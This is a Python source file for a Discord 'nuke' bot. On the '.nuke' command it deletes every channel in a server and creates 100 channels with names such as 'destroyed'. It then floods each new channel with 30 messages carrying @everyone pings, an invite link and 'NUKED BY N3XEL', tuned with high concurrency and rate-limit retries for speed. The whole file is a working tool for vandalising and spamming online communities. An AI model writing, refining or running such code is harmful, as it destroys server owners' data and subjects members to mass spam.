import asyncio
import discord
from discord.ext import commands
import random
import time
import os

# --- CONFIGURE THESE ---
BOT_TOKEN = os.getenv("TOKEN")
if not BOT_TOKEN:
    raise ValueError("No TOKEN found. Set TOKEN on Railway.")

PREFIX = "."

# Channel names (randomly chosen)
CHANNEL_NAMES = [
    "𝔫𝔦𝔤𝔥𝔱𝔪𝔞𝔯𝔢 𝔦𝔰 𝔥𝔢𝔯𝔢",
    "ɴɪɢʜᴛᴍᴀʀᴇ ɪs ʜᴇʀᴇ",
    "ⁿⁱᵍʰᵐᵃʳᵉ ⁱˢ ʰᵉʳᵉ",
    "₦ł₲Ⱨ₮₥₳ⱤɆ ł₴ ⱧɆⱤɆ",
    "d̸e̸st̸r̸o̸y̸e̸d̸",
    "n҈i҈g҈h҈m҈a҈r҈e҈ i҈s҈ h҈e҈r҈e҈",
    "d҉e҉s҉t҉r҉o҉y҉e҉d҉d",
    "dєstrσчєd",
    "n̶i̶g̶h̶t̶m̶a̶r̶e̶"
]

MESSAGE = "# NUKED BY N3XEL\nhttps://discord.gg/qhuMKeShn\n||@everyone|| ||@here||"
AMOUNT_OF_CHANNELS = 100
MESSAGES_PER_CHANNEL = 30  # each channel gets exactly 30 messages

# Concurrency (higher = faster, but Discord may rate limit)
DELETE_CONCURRENCY = 30
CREATE_CONCURRENCY = 20
MESSAGE_CONCURRENCY = 100   # send 100 messages at once across all channels

# -----------------------
# DO NOT MODIFY BELOW
# -----------------------

def get_channel_name():
    return random.choice(CHANNEL_NAMES)

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

async def send_messages_parallel(channels, messages_per_channel):
    """Send messages_per_channel to each channel, all at once, with high concurrency"""
    if not channels:
        return
    total_messages = len(channels) * messages_per_channel
    print(f"Sending {total_messages} messages ({messages_per_channel} per channel) in parallel...")
    
    semaphore = asyncio.Semaphore(MESSAGE_CONCURRENCY)
    
    async def send_one(channel):
        async with semaphore:
            try:
                await channel.send(MESSAGE)
            except discord.HTTPException as e:
                if e.status == 429:
                    await asyncio.sleep(e.retry_after)
                    await channel.send(MESSAGE)
            except Exception:
                pass
    
    # Create a list of tasks: for each channel, repeat messages_per_channel times
    tasks = []
    for ch in channels:
        for _ in range(messages_per_channel):
            tasks.append(send_one(ch))
    
    # Run them all concurrently
    await asyncio.gather(*tasks, return_exceptions=True)
    print("All messages sent.")

async def nuke_server(guild: discord.Guild):
    print(f"Starting nuke on {guild.name} ({guild.id})")
    start_time = time.perf_counter()

    # Step 1: Delete all channels (batched)
    print("Deleting all channels...")
    channels_list = list(guild.channels)
    for i in range(0, len(channels_list), DELETE_CONCURRENCY):
        batch = channels_list[i:i+DELETE_CONCURRENCY]
        await asyncio.gather(*(ch.delete() for ch in batch), return_exceptions=True)
    print("All channels deleted.")

    # Step 2: Create new channels (batched)
    print(f"Creating {AMOUNT_OF_CHANNELS} channels...")
    created_channels = []
    for i in range(0, AMOUNT_OF_CHANNELS, CREATE_CONCURRENCY):
        batch_size = min(CREATE_CONCURRENCY, AMOUNT_OF_CHANNELS - i)
        tasks = []
        for _ in range(batch_size):
            name = get_channel_name()
            tasks.append(guild.create_text_channel(name))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, discord.TextChannel):
                created_channels.append(r)
        await asyncio.sleep(0.3)  # brief pause to avoid global rate limit
    print(f"Created {len(created_channels)} channels.")

    # Step 3: Send messages in parallel across all channels
    if created_channels:
        await send_messages_parallel(created_channels, MESSAGES_PER_CHANNEL)

    elapsed = time.perf_counter() - start_time
    print(f"Nuke completed in {elapsed:.2f} seconds!")

@bot.event
async def on_ready():
    print(f"Bot is online as {bot.user}")
    print(f"Prefix: {PREFIX}")
    print(f"Command: {PREFIX}nuke")
    print("=" * 50)

@bot.command(name="nuke")
async def nuke(ctx):
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ You need Administrator permission to use this command!")
        return
    await ctx.send("💣 Nuking server in progress...")
    await nuke_server(ctx.guild)

@bot.command(name="config")
async def config(ctx):
    config_msg = f"""
**Current Configuration:**
📝 Channel Names: `{len(CHANNEL_NAMES)} variants`
💬 Message: `{MESSAGE[:50]}...`
📊 Channels: `{AMOUNT_OF_CHANNELS}`
📨 Messages per Channel: `{MESSAGES_PER_CHANNEL}`
⚡ Delete Concurrency: `{DELETE_CONCURRENCY}`
⚡ Create Concurrency: `{CREATE_CONCURRENCY}`
⚡ Message Concurrency: `{MESSAGE_CONCURRENCY}`
    """
    await ctx.send(config_msg)

if __name__ == "__main__":
    print("Starting Nuke Bot (parallel messages)...")
    print("=" * 50)
    bot.run(BOT_TOKEN) 
